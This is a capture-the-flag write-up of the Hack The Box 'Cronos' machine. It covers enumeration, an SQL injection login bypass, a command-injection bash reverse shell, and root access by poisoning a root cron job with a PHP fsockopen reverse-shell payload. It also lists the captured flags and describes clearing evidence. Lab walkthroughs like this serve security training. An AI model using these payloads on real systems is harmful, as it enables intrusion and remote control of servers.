# HTB: Cronos

## Engagement Overview

**Target:** Cronos  
**Box IP:** 10.10.10.13   
**Local IP:** 10.10.14.10   
**Date:** 2025-07-12

---

### Objectives

- Exploit SQL injection and command injection to obtain a shell
- Compromise cron jobs to achieve privilege escalation to root
- Capture user and root flags

---

## Service Enumeration

```bash
# Nmap (condensed)
nmap -sC -sV -oN nmap.txt 10.10.10.13
```

**Relevant output (condensed):**

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1
53/tcp open  domain  ISC BIND 9.10.3-P4
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

- DNS SOA present for `cronos.htb`
- Gobuster found nothing useful in this engagement
- Burp Suite repeater demonstrated directory listings via command injection payloads

---

## Initial Access

### SQL Injection → Command Injection

- Bypassed login at `admin.cronos.htb` using typical injection: `' or 1=1-- -`
- Used Burp Suite to craft a command injection payload via a parameter that executed arbitrary commands on the server, e.g.:
  ```
  command=bash -c 'bash -i >& /dev/tcp/10.10.14.24/443 0>&1'&host=/var/www
  ```
- Result: web shell / interactive command execution as `www-data`

---

## Privilege Escalation

### Cron Job Poisoning

- Observed root cron entry running Laravel scheduled task:
  ```
  * * * * *  root  php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
  ```
- Injected a payload that opened a reverse shell to attacker host via PHP/command injection; cron executed as root and provided a root shell.

**Example payload used (conceptual):**
```php
$sock=fsockopen("10.10.14.10",443);
exec("/bin/sh -i <&3 >&3 2>&3");
```

**Flags captured:**
- `user.txt`: `e053208bdfc3ad87d7d492285a15512a`
- `root.txt`: `d800ebbbb59fee6c01e6e2f208e41416`

---

## House Cleaning / Post-Exploitation

- Removed uploaded artifacts and reversed modifications to artisan where applicable
- Removed `linpeas.sh` and cleared evidence as appropriate

---

## Tools Utilized
- nmap, gobuster, Burp Suite, linPEAS

---

## Key Takeaways
- SQL injection can be escalated to command injection and full compromise when input is unsafely executed server-side.
- Cron jobs that execute web-app-supplied content are high-risk and should be restricted/validated.
- Comprehensive application-level hardening and least privilege for scheduled tasks are crucial.
